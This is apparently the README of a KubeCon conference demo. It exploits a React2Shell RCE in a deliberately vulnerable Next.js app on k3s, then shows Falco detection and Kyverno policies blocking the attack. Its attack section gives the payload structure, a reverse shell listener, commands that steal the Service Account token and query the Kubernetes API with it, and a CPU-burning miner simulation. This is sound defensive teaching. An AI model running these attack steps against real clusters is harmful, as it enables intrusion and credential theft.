# How We Stopped a Crypto-mining Attack in Kubernetes Caused by a Next.js RCE

### KubeCon India 2026

This repo has everything needed to reproduce the demo from the talk — the vulnerable Next.js app, the React2Shell exploit script, Falco detection rules, Kyverno policies, and a cheatsheet for running it live on stage.

The attack scenario is based on React2Shell (CVE-2025-55182), a critical unauthenticated RCE in React Server Components that was actively exploited in the wild to deploy cryptominers within hours of disclosure.

---

## What this demo shows

Most Kubernetes security incidents don't start in Kubernetes. They start in the application. This demo walks through exactly that:

1. A Next.js app running React 19.0.0 (affected by React2Shell) is deployed in k3s
2. A single malicious HTTP POST triggers unsafe deserialization in the React Flight protocol
3. The server executes attacker-controlled JavaScript — no authentication required
4. A reverse shell connects back from inside the pod to the attacker's listener
5. The attacker steals the mounted Service Account token and queries the Kubernetes API
6. A cryptominer simulation starts — CPU spikes with nothing to stop it
7. Falco catches every step of the attack in real time with CRITICAL alerts
8. Kyverno policies block the dangerous configurations before they can even deploy

The core message of the talk is not "look how scary RCE is." It is that patching Next.js alone is not enough. You need runtime detection and policy enforcement so that when the next vulnerability drops, your cluster does not become someone else's mining rig.

---

## Demo architecture

```
EC2 (Ubuntu 26.04)
 └── k3s (single node)
      ├── namespace: demo
      │    ├── nextjs-vulnerable (React 19.0.0 - React2Shell affected)
      │    └── nextjs-sa (overpermissive ServiceAccount - intentional for demo)
      ├── namespace: falco
      │    ├── falco (runtime threat detection via eBPF)
      │    └── falco-falcosidekick-ui (alert dashboard)
      └── namespace: kyverno
           └── kyverno-admission-controller (policy enforcement)
```

---

## CVE-2025-55182 — React2Shell

| Field | Value |
|---|---|
| CVE ID | CVE-2025-55182 |
| Affected component | React Server Components (RSC) Flight protocol |
| Affected versions | React 19.0.0 – 19.2.0, Next.js 15.x before patch |
| Attack vector | Network, unauthenticated, single HTTP request |
| CVSS score | 10.0 (Critical) |

The vulnerability lives in how the React Flight protocol deserializes incoming payloads. The server processes attacker-controlled data without validation, allowing prototype chain traversal to reach JavaScript's `Function` constructor and execute arbitrary code server-side.

The exploit sends a crafted multipart POST to any Server Action endpoint:

```
POST / HTTP/1.1
Next-Action: <server-action-id>
Content-Type: multipart/form-data

_prefix: <malicious JavaScript>
_formData.get: $1:constructor:constructor   ← reaches Function()
then: $1:__proto__:then                     ← traverses prototype chain
```

When the server deserializes this payload, it walks the prototype chain, reaches `Function`, and executes the attacker's JavaScript with full server privileges.

---

## Key concepts

### The attack chain

```
Single malicious HTTP POST
        |
        v
React Flight protocol deserializes payload
        |
        v
Prototype pollution reaches Function constructor
        |
        v
Arbitrary JavaScript executes server-side (RCE)
        |
        v
Reverse shell connects back to attacker
        |
        v
Attacker reads SA token, queries Kubernetes API
        |
        v
Cryptominer starts — CPU climbs to 800m+
        |
        v
Without defenses: blast radius = entire cluster
```

### The defense layers

```
Layer 1 - Patch        : Update React/Next.js (fixes the entry point)
Layer 2 - RBAC         : Least privilege SA (limits what attacker can do after RCE)
Layer 3 - Limits       : Resource limits (caps CPU the miner can steal)
Layer 4 - Falco        : Runtime detection (catches attacker behavior live)
Layer 5 - Kyverno      : Admission control (blocks dangerous configs at deploy time)
```

### Falco vs Kyverno

| Tool | Role | When it acts |
|---|---|---|
| Falco | Detection | Runtime — after the pod is running |
| Kyverno | Prevention | Admission — before the pod is created |

Neither tool stops the RCE itself. Together they stop the RCE from becoming a cluster-wide disaster.

### Service Account mental model

```
Service Account = Identity    (WHO are you?)
RBAC            = Permissions (WHAT can you do?)
Token           = Proof       (mounted at /var/run/secrets/kubernetes.io/serviceaccount/token)
```

The attacker steals this token from inside the container after gaining RCE. The permissions attached to the Service Account determine how far they can move inside the cluster.

### Blast radius

```
RCE + weak SA permissions   = small blast radius  (container only)
RCE + strong SA permissions = large blast radius  (entire cluster)
```

### How we simulated the cryptominer

This comes up in every Q&A.

A real cryptominer like XMRig burns CPU doing hash calculations to earn cryptocurrency. Our simulation runs:

```bash
dd if=/dev/zero of=/dev/null &
```

This reads from an infinite source of zeros and writes them to a black hole — burning CPU continuously, doing nothing useful. Same resource theft behavior, no actual mining.

The important thing is that Falco detects behavior, not intent. Whether it is XMRig or `dd if=/dev/zero`, an unexpected process spawning inside a container is suspicious. Falco does not care what the process is doing mathematically — it cares that something unexpected is running. That is what triggers the CRITICAL alert.

Short answer for Q&A: "We replaced a real miner with a Linux command that burns CPU doing nothing. Falco caught it either way."

---

## Prerequisites

- EC2 running Ubuntu 22.04, 24.04, or 26.04 — t3.large minimum
- k3s installed
- Helm v3
- Docker Hub account (to push the vulnerable image)
- Port 2802 open in EC2 security group (Falco UI)
- Port 30080 open in EC2 security group (Next.js app)
- Python3 installed on EC2 (pre-installed on Ubuntu)

---

## Setup

### Step 1: Configure kubectl

```bash
mkdir -p ~/.kube
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown $USER:$USER ~/.kube/config
echo 'export KUBECONFIG=~/.kube/config' >> ~/.bashrc
export KUBECONFIG=~/.kube/config
kubectl get nodes
```

### Step 2: Install metrics-server

```bash
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

kubectl patch deployment metrics-server -n kube-system \
  --type='json' \
  -p='[{"op":"add","path":"/spec/template/spec/containers/0/args/-","value":"--kubelet-insecure-tls"}]'

# wait ~60 seconds then verify
kubectl top nodes
```

### Step 3: Install Helm

```bash
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
```

### Step 4: Build and push the vulnerable Next.js image

Run this on your local machine — much faster than EC2.

```bash
# from the repo root
docker buildx build \
  --platform linux/amd64 \
  -t YOUR_DOCKERHUB_USERNAME/nextjs-vulnerable-app:v2 \
  --push .
```

The app uses React 19.0.0 with a Server Action endpoint — this is what the exploit targets.

### Step 5: Deploy the vulnerable app

```bash
# update image name in manifests/app/deployment.yaml first
kubectl apply -f manifests/app/deployment.yaml
kubectl get all -n demo
```

### Step 6: Install Falco with custom rules

```bash
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  -f manifests/falco/custom-rules-values.yaml

kubectl rollout status daemonset/falco -n falco
```

### Step 7: Install Kyverno

```bash
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo update

helm install kyverno kyverno/kyverno \
  --namespace kyverno \
  --create-namespace \
  --set admissionController.replicas=1 \
  --set backgroundController.enabled=false \
  --set cleanupController.enabled=false \
  --set reportsController.enabled=false

kubectl apply -f manifests/kyverno/policies.yaml
kubectl get clusterpolicy
```

---

## Act 1: The attack (no defenses)

### Start the Falco log stream (Terminal 1)

```bash
kubectl logs -f -n falco -l app.kubernetes.io/name=falco -c falco --since=10s
```

### Start the reverse shell listener (Terminal 2)

```bash
nc -lvnp 4444 -s 0.0.0.0
```

### Fire the exploit (Terminal 3)

```bash
python3 exploit.py <EC2-INTERNAL-IP> <EC2-INTERNAL-IP>
# example: python3 exploit.py 172.31.36.195 172.31.36.195
```

The script automatically discovers the Server Action ID from the live page, then fires the malicious multipart POST to the RSC Flight endpoint.

### Once the reverse shell lands (back in Terminal 2)

```sh
# attacker recon
whoami
hostname
id

# steal kubernetes credentials
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# use stolen token to query k8s API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/demo/pods

# start cryptominer simulation
dd if=/dev/zero of=/dev/null &
dd if=/dev/zero of=/dev/null &
```

### Watch CPU spike (Terminal 4)

```bash
watch kubectl top pods -n demo
# climbs to 800m+ with nothing to stop it
```

---

## Act 2: Detection with Falco

Re-run the attack with Falco logs tailing. You will see these alerts fire in sequence:

| Rule | Priority | MITRE tag | Triggered by |
|---|---|---|---|
| Reverse Shell Detected | Critical | T1059 | shell spawned from node process |
| Sensitive Token Read | Critical | T1528 | `cat token` |
| Unexpected Outbound Network Tool | Warning | T1105 | `wget` |
| Cryptominer Process Detected | Critical | — | `dd if=/dev/zero` |

Access the Falco UI:

```bash
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802:2802 --address 0.0.0.0
# open http://YOUR_EC2_PUBLIC_IP:2802
```

---

## Act 3: Prevention with Kyverno

Try deploying bad pods — all should be blocked with clear error messages:

```bash
kubectl apply -f manifests/kyverno/test-bad-no-limits.yaml    # blocked: no resource limits
kubectl apply -f manifests/kyverno/test-bad-sa-token.yaml     # blocked: SA token mounted
kubectl apply -f manifests/kyverno/test-bad-privileged.yaml   # blocked: privileged container
kubectl apply -f manifests/kyverno/test-good-pod.yaml         # allowed: satisfies all policies
```

| Policy | What it blocks | Why it matters |
|---|---|---|
| `require-resource-limits` | Pods without CPU/memory limits | Stops miner from eating the entire node |
| `block-automount-sa-token` | Pods with SA token mounted | Stops credential theft after RCE |
| `block-privileged-containers` | Privileged pods | Prevents container escape |
| `require-non-root` | Root user containers | Limits attacker access post-RCE |

---

## Reset between demo runs

```bash
# kill miners and restart pod cleanly
kubectl rollout restart deployment/nextjs-vulnerable -n demo

# delete test pods
kubectl delete pod bad-pod-no-limits bad-pod-sa-token bad-pod-privileged good-pod \
  -n demo --ignore-not-found

# restart nc listener
pkill nc
nc -lvnp 4444 -s 0.0.0.0
```

---

## Cleanup

```bash
kubectl delete namespace demo
kubectl delete namespace falco
kubectl delete namespace kyverno
kubectl delete clusterpolicy --all
```

---

## Talk abstract

Modern frameworks help teams move fast, but a single vulnerability can quickly escalate into a serious security incident. In this talk, we simulate a real-world attack scenario where a publicly disclosed RCE vulnerability in Next.js is exploited to deploy crypto-mining workloads inside a Kubernetes cluster. We demonstrate how an application-level vulnerability can quickly escalate into a cluster-wide threat — and how to prevent it before it does. We break down how such an attack unfolds, the runtime indicators that can expose it, and why patching the application alone is not enough. We then demonstrate how to stop this class of attack using Falco for runtime threat detection and Kyverno for policy enforcement — detecting malicious activity, blocking misuse, and limiting blast radius.

---

## References

- [CVE-2025-55182 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [React2Shell original PoC - Lachlan Davidson](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [React2Shell CTF walkthrough](https://github.com/yz9yt/React2Shell-CTF)
- [React2Shell deep dive - Wiz](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
- [Falco documentation](https://falco.org/docs/)
- [Kyverno documentation](https://kyverno.io/docs/)
- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/)